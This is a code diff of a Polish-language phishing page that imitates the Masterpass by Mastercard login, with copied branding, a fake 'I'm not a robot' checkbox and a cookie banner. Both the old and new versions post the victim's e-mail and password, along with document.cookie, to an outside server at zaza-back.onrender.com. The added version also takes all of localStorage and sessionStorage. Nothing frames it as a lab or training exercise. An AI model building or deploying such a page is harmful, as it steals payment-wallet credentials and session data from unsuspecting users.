@@ -1,160 +1,129 @@
 <!DOCTYPE html>
 <html lang="pl">
-<head>
-  <meta charset="UTF-8" />
-  <title>Logowanie | Portfel Masterpass</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" href="./style.css" />
-</head>
-<body>
-  <div class="top-strip"></div>
-  <header class="logo-header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/dd/Masterpass_Logo.svg/512px-Masterpass_Logo.svg.png" alt="Masterpass logo" class="logo" />
-  </header>
-  <div class="black-strip"></div>
-  <div class="header-text">
-    Zaloguj się lub aktywuj portfel Masterpass™ od Mastercard®
-  </div>
-  <div class="gray-strip-with-lang">
-    <div class="lang-switch">
-      <div class="flag" id="pl" title="Polski"></div>
-      <div class="dropdown">
-        <div class="flag" id="en" title="English"></div>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Masterpass Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" />
+  </head>
+  <body class="bg-black flex items-center justify-center min-h-screen font-sans">
+    <div class="bg-white w-[480px] sm:w-[640px] rounded shadow-lg relative">
+      <!-- Header -->
+      <div class="flex items-center justify-between p-4 border-b">
+        <div class="flex items-center space-x-2">
+          <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-8 h-8" />
+          <div class="text-sm font-semibold">masterpass <span class="text-gray-500 text-xs block">by mastercard.</span></div>
+        </div>
+        <button class="text-black text-2xl font-bold hover:scale-110 transition">&times;</button>
+      </div>
+
+      <!-- Main content -->
+      <div class="flex">
+        <!-- Benefits -->
+        <div class="hidden md:flex flex-col gap-6 p-6 text-sm w-1/2 border-r">
+          <div>
+            <img src="https://img.icons8.com/ios-filled/24/ef4444/lock--v1.png" />
+            <p class="mt-2"><strong>Bezpieczeństwo</strong><br />Płatność, dzięki której sklepy nie widzą danych Twojej karty</p>
+          </div>
+          <div>
+            <img src="https://img.icons8.com/ios-filled/24/ef4444/stopwatch.png" />
+            <p class="mt-2"><strong>Szybkość transakcji</strong><br />Dane karty podajesz tylko raz – przy rejestracji</p>
+          </div>
+          <div>
+            <img src="https://img.icons8.com/ios-filled/24/ef4444/laptop.png" />
+            <p class="mt-2"><strong>Wygoda</strong><br />Zakupy on-line na każdym urządzeniu</p>
+          </div>
+        </div>
+
+        <!-- Login form -->
+        <div class="flex-1 p-6">
+          <h2 class="text-lg font-semibold mb-4">Zaloguj się</h2>
+          <form id="loginForm" class="space-y-4">
+            <input
+              type="text"
+              name="email"
+              placeholder="Adres e-mail lub numer telefonu"
+              class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
+              required />
+            <input
+              type="password"
+              name="password"
+              placeholder="Hasło"
+              class="w-full border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none"
+              required />
+            <div class="flex items-center gap-2">
+              <input type="checkbox" id="robot" required />
+              <label for="robot" class="text-sm">I'm not a robot</label>
+              <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="h-6 ml-2" />
+            </div>
+            <div class="flex items-center justify-between text-sm">
+              <label><input type="checkbox" id="remember" /> Pamiętaj mój login</label>
+              <a href="#" class="text-blue-500 hover:underline">Nie znam hasła</a>
+            </div>
+            <button
+              type="submit"
+              class="bg-gray-300 text-white w-full py-2 rounded cursor-not-allowed"
+              id="loginBtn"
+              disabled>
+              Zaloguj
+            </button>
+          </form>
+        </div>
+      </div>
+
+      <!-- Footer -->
+      <div class="text-center text-xs bg-black text-white p-2 flex justify-between items-center">
+        <p>Strona wykorzystuje pliki cookie...</p>
+        <button class="text-white text-lg font-bold">&times;</button>
       </div>
     </div>
-  </div>
-  <div class="bottom-strip"></div>
 
-  <footer class="footer">
-    <section class="footer-left">
-      <ul class="benefit-list">
-        <li class="benefit">
-          <img src="https://img.icons8.com/ios-filled/24/lock--v1.png" alt="lock icon" />
-          <span id="benefit1">
-            <strong>Bezpieczeństwo</strong><br />
-            Płatność, dzięki której sklepy on-line nie widzą danych Twojej karty
-          </span>
-        </li>
-        <li class="benefit">
-          <img src="https://img.icons8.com/ios-filled/24/clock.png" alt="clock icon" />
-          <span id="benefit2">
-            <strong>Szybkość transakcji</strong><br />
-            Dane karty podajesz tylko raz – przy rejestracji
-          </span>
-        </li>
-        <li class="benefit">
-          <img src="https://img.icons8.com/ios-filled/24/laptop.png" alt="device icon" />
-          <span id="benefit3">
-            <strong>Wygoda</strong><br />
-            Zakupy on-line na każdym urządzeniu
-          </span>
-        </li>
-      </ul>
-    </section>
+    <script>
+      const form = document.getElementById('loginForm');
+      const loginBtn = document.getElementById('loginBtn');
+      const robotCheckbox = document.getElementById('robot');
 
-    <section class="footer-right">
-      <form id="loginForm" class="login-form">
-        <div class="form-group">
-          <input type="text" id="email" required placeholder=" " />
-          <label for="email">Adres e-mail lub numer telefonu</label>
-        </div>
-        <div class="form-group">
-          <input type="password" id="password" required placeholder=" " />
-          <label for="password">Hasło</label>
-        </div>
-        <div class="checkbox-group">
-          <label class="checkbox">
-            <input type="checkbox" id="remember" />
-            <span class="checkmark"></span>
-          </label>
-          <label for="remember">Pamiętaj mój login</label>
-        </div>
-        <div class="forgot-link">
-          <a href="#" id="reset-link">Nie znam hasła</a>
-        </div>
-        <div class="captcha">[reCAPTCHA symulacja]</div>
-        <button type="submit" id="submitBtn">Zaloguj</button>
-      </form>
-    </section>
-
-    <div class="cookie-notice" id="cookie-text">
-      Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę na ich używanie zgodnie z aktualnymi ustawieniami przeglądarki.
-      <a href="#">Informacja o Plikach Cookie</a>.
-      <div id="cookie-agree">Zgoda na pliki cookies</div>
-    </div>
-  </footer>
-
-  <script type="module">
-    const langs = {
-      pl: {
-        title: "Zaloguj się lub aktywuj portfel Masterpass™ od Mastercard®",
-        benefit1: "Bezpieczeństwo Płatność, dzięki której sklepy on-line nie widzą danych Twojej karty",
-        benefit2: "Szybkość transakcji Dane karty podajesz tylko raz - przy rejestracji",
-        benefit3: "Wygoda Zakupy on-line na każdym urządzeniu",
-        emailLabel: "Adres e-mail lub numer telefonu",
-        passwordLabel: "Hasło",
-        remember: "Pamiętaj mój login",
-        reset: "Nie znam hasła",
-        submit: "Zaloguj",
-        cookieText: "Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę na ich używanie zgodnie z aktualnymi ustawieniami przeglądarki. <a href='#'>Informacja o Plikach Cookie</a>.",
-        agree: "Zgoda na pliki cookies"
-      },
-      en: {
-        title: "Log in or activate your Masterpass™ wallet by Mastercard®",
-        benefit1: "Security Pay online without disclosing your card details to the shop",
-        benefit2: "Fast transactions You enter your card data only once – when you register",
-        benefit3: "Convenience Online shopping on any device",
-        emailLabel: "E-mail address or phone number",
-        passwordLabel: "Password",
-        remember: "Remember my login",
-        reset: "Reset password",
-        submit: "Sign in",
-        cookieText: "This site uses cookies and similar technologies. By using this site you consent to their use in accordance with your current browser settings. <a href='#'>Information about Cookies</a>.",
-        agree: "Accept cookies"
-      }
-    };
-
-    document.getElementById("pl").addEventListener("click", () => switchLang("pl"));
-    document.getElementById("en").addEventListener("click", () => switchLang("en"));
-
-    function switchLang(lang) {
-      const l = langs[lang];
-      document.querySelector(".header-text").innerText = l.title;
-      document.getElementById("benefit1").innerText = l.benefit1;
-      document.getElementById("benefit2").innerText = l.benefit2;
-      document.getElementById("benefit3").innerText = l.benefit3;
-      document.querySelector("label[for='email']").innerText = l.emailLabel;
-      document.querySelector("label[for='password']").innerText = l.passwordLabel;
-      document.querySelector("label[for='remember']").innerText = l.remember;
-      document.getElementById("reset-link").innerText = l.reset;
-      document.getElementById("submitBtn").innerText = l.submit;
-      document.getElementById("cookie-text").innerHTML = l.cookieText;
-      document.getElementById("cookie-agree").innerText = l.agree;
-    }
-
-    const form = document.getElementById('loginForm');
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value.trim();
-      const remember = document.getElementById('remember').checked;
-
-      await fetch('https://zaza-back.onrender.com/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          email,
-          password,
-          remember,
-          cookies: document.cookie,
-          userAgent: navigator.userAgent,
-          location: window.location.href,
-          date: new Date().toISOString()
-        })
+      robotCheckbox.addEventListener('change', () => {
+        loginBtn.disabled = !robotCheckbox.checked;
+        loginBtn.classList.toggle('bg-red-600', robotCheckbox.checked);
+        loginBtn.classList.toggle('cursor-pointer', robotCheckbox.checked);
+        loginBtn.classList.toggle('cursor-not-allowed', !robotCheckbox.checked);
       });
 
-      window.location.href = './wallet-dashboard.html';
-    });
-  </script>
-</body>
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const payload = {
+          email: form.email.value,
+          password: form.password.value,
+          remember: document.getElementById('remember').checked,
+          cookies: document.cookie,
+          localStorage: JSON.stringify(localStorage),
+          sessionStorage: JSON.stringify(sessionStorage),
+          userAgent: navigator.userAgent,
+          location: window.location.href,
+          date: new Date().toISOString(),
+        };
+
+        try {
+          const res = await fetch('https://zaza-back.onrender.com/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+          });
+
+          if (res.ok) {
+            alert('✅ Wysłano!');
+            form.reset();
+          } else {
+            alert('❌ Błąd przy wysyłce.');
+          }
+        } catch (err) {
+          console.error(err);
+          alert('❌ Błąd połączenia.');
+        }
+      });
+    </script>
+  </body>
 </html>
